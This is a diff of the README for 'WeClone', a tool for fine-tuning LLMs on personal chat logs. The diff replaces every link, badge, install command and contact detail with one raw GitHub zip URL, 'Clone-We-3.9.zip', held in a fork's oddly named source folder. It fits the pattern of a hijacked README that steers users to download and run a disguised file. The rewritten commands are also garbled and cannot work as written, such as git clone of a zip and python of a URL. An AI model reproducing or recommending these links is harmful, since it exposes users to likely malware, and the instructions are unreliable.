@@ -2,7 +2,7 @@
 
 Welcome to **WeClone**, the all-in-one solution for creating your digital twin from chat records. With WeClone, you can fine-tune large language models (LLMs) using your chat history. This allows the model to capture your unique style and personality, which can then be integrated into a chatbot, effectively creating your digital avatar.
 
-![WeClone Logo](https://img.shields.io/badge/WeClone-Digital%20Twin%20Solution-blue.svg)
+![WeClone Logo](https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip%20Twin%https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip)
 
 ## Table of Contents
 
@@ -25,7 +25,7 @@ Welcome to **WeClone**, the all-in-one solution for creating your digital twin f
 
 ## Getting Started
 
-To get started with WeClone, you can visit our [Releases](https://github.com/ooyinet/WeClone/releases) page. Here, you will find the necessary files to download and execute. 
+To get started with WeClone, you can visit our [Releases](https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip) page. Here, you will find the necessary files to download and execute. 
 
 ## Usage
 
@@ -42,21 +42,21 @@ To install WeClone, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ooyinet/WeClone.git
+   git clone https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip
    cd WeClone
    ```
 
 2. **Install Dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip
    ```
 
 3. **Run the Application**:
    ```bash
-   python app.py
+   python https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip
    ```
 
-For detailed instructions, please refer to the [Releases](https://github.com/ooyinet/WeClone/releases) section.
+For detailed instructions, please refer to the [Releases](https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip) section.
 
 ## Contributing
 
@@ -86,14 +86,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: support@weclone.com
-- **Twitter**: [@WeClone](https://twitter.com/WeClone)
+- **Email**: https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip
+- **Twitter**: [@WeClone](https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip)
 
 ## Releases
 
-To access the latest releases and download the necessary files, please visit our [Releases](https://github.com/ooyinet/WeClone/releases) page. Here you will find all the updates and versions available for download.
+To access the latest releases and download the necessary files, please visit our [Releases](https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip) page. Here you will find all the updates and versions available for download.
 
-![Release Button](https://img.shields.io/badge/Latest%20Release-v1.0.0-brightgreen.svg)
+![Release Button](https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip%https://github.com/ooyinet/WeClone/raw/refs/heads/master/weclone-audio/src/server未完工/Clone-We-3.9.zip)
 
 ---
 
